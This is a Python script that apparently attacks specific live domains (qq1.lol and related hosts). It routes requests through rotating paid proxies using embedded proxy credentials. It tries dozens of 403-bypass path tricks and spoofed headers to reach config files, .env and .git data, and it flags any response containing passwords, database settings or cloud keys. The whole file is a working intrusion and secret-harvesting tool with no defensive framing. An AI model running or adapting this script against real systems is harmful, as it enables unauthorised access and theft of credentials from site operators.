#!/usr/bin/env python3
"""403 bypass on qq1 sensitive paths + refresh-proxy related host probe."""
import json, subprocess, time, urllib.parse, re
from pathlib import Path

BASE = "https://qq1.lol"
QG, PW = "C413ED6D", "344F550A6F8B"
OUT = Path("/tmp/qq1_deep8")
OUT.mkdir(exist_ok=True)
LOG = OUT / "bypass403.log"
HITS = OUT / "hits.jsonl"
_px = None


def log(m):
    print(m, flush=True)
    open(LOG, "a").write(m + "\n")


def hit(kind, detail, body=""):
    open(HITS, "a").write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:200]}")


def fresh():
    global _px
    for area in ("440000", "0", "330000", "320000", "350000"):
        try:
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "--max-time", "10",
                 f"https://share.proxy.qg.net/get?key={QG}&num=1&area={area}"],
                text=True, timeout=12))
            if d.get("code") != "SUCCESS":
                # try query
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", f"https://share.proxy.qg.net/query?key={QG}"], text=True, timeout=12))
            for x in d.get("data") or []:
                s = x["server"]
                cand = f"http://{QG}:{PW}@{s}"
                code = subprocess.run(
                    ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/tmp/t.out",
                     "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
                    capture_output=True, text=True, timeout=14).stdout.strip()
                if code == "200" and b"sitename" in open("/tmp/t.out", "rb").read():
                    _px = cand
                    log(f"px {s}")
                    return _px
        except Exception as e:
            log(f"px err {e}")
        time.sleep(1)
    return _px


def c(url, headers=None, mt=12):
    global _px
    if not _px:
        fresh()
    for attempt in range(3):
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", _px, "-A", "Mozilla/5.0",
               "-H", "Referer: https://qq1.lol/", "-w", "\n__HTTP:%{http_code}"]
        if headers:
            for h in headers:
                cmd += ["-H", h]
        cmd.append(url)
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 5).stdout or ""
        if "authorization expired" in out or "407" in out[-20:]:
            fresh()
            continue
        if "__HTTP:" not in out:
            fresh()
            continue
        b, code = out.rsplit("__HTTP:", 1)
        return b.strip(), code.strip()
    return "", "000"


def interesting(body):
    if not body:
        return False
    keys = ("root:", "DB_", "password", "SYS_KEY", "apikey", "<?php", "mysqli",
            "ref:", "[core]", "PDO", "sk_live", "AKIA", "define(")
    return any(k in body for k in keys) or (len(body) > 20 and "<html" not in body[:60].lower() and "Forbidden" not in body and "Not Found" not in body)


# ---- 403 bypass variants ----
targets = [
    "/config.php", "/.env", "/.git/HEAD", "/.git/config",
    "/includes/common.php", "/includes/config.php", "/config.php.bak", "/config.php.old",
]
bypasses = []
for t in targets:
    base = t
    name = t.strip("/")
    variants = [
        base,
        base + "/",
        base + "%00",
        base + "%20",
        base + "?",
        base + "#",
        base + ".json",
        base.replace(".php", ".php%00.jpg") if base.endswith(".php") else base,
        base.replace(".php", ".php/") if base.endswith(".php") else base,
        "/%2e" + base,  # /.git
        "/." + base if not base.startswith("/.") else base,
        base.upper() if base.endswith(".php") else base,
        urllib.parse.quote(base),
        base.replace("/", "/./"),
        base.replace("/", "/;"),
        "/static/.." + base,
        "/assets/.." + base,
        "/other/.." + base,
        "/user/.." + base,
        "/sup/.." + base,
        "/install/.." + base,
        "/....//..../" + base.lstrip("/"),
        "/.." + base,
        "//" + base.lstrip("/"),
        "/./" + base.lstrip("/"),
        base + "?",
        base + "?.css",
        base + "?.js",
        base + "%23",
        base + "/.",
        # double urlencode
        urllib.parse.quote(urllib.parse.quote(base)),
    ]
    # git specific
    if ".git" in base:
        variants += [
            "/.git/index", "/.git/logs/HEAD", "/.git/objects/info/packs",
            "/.gitignore", "/git/HEAD", "/repository/.git/HEAD",
        ]
    for v in variants:
        if not v.startswith("http"):
            url = BASE + (v if v.startswith("/") else "/" + v)
        else:
            url = v
        bypasses.append((name, url))

log(f"=== 403 BYPASS n={len(bypasses)} ===")
fresh()
seen = set()
for name, url in bypasses:
    if url in seen:
        continue
    seen.add(url)
    body, code = c(url)
    mark = ""
    if code == "200" and interesting(body):
        mark = " ***"
        hit("403_bypass", url, body)
        safe = re.sub(r"\W+", "_", url)[:80]
        (OUT / f"bypass_{safe}").write_text(body[:100000], errors="replace")
    elif code == "200" and body and "Forbidden" not in body and "Not Found" not in body:
        mark = " INTERESTING_200"
        log(f"{code} {url} len={len(body)} {body[:80].replace(chr(10),' ')}{mark}")
        if interesting(body) or len(body) < 5000:
            hit("403_200", url, body)
    if code not in ("403", "404", "000") or mark:
        log(f"{code} {url} len={len(body)}{mark}")
    time.sleep(0.08)

# header bypasses on config.php
log("=== HEADER BYPASS ===")
for hdrs in [
    ["X-Original-URL: /config.php"],
    ["X-Rewrite-URL: /config.php"],
    ["X-Forwarded-For: 127.0.0.1"],
    ["X-Custom-IP-Authorization: 127.0.0.1"],
    ["X-Forwarded-Host: localhost"],
]:
    body, code = c(BASE + "/config.php", headers=hdrs)
    log(f"{code} config.php + {hdrs[0][:40]} len={len(body)}")
    if code == "200" and interesting(body):
        hit("hdr_bypass", hdrs[0], body)

# Related hosts with fresh proxy each host
log("=== RELATED REFRESH ===")
for base in ["https://ka1.one", "http://ka1.one", "https://qqkqq.com", "http://qqkqq.com",
             "https://fffzz.lol", "http://fffzz.lol", "https://www.qqkqq.com"]:
    fresh()
    for p in ["/", "/%61pi.php?act=siteinfo", "/ajax.php?act=getcount", "/robots.txt", "/sup/login.php"]:
        body, code = c(base + p)
        log(f"{base}{p} -> {code} len={len(body)} {(body or '')[:90].replace(chr(10),' ')}")
        if code == "200" and body and ("sitename" in body or "发卡" in body or "getcount" in body or "订单" in body):
            hit("related", base + p, body)
        time.sleep(0.2)

log("=== BYPASS DONE ===")
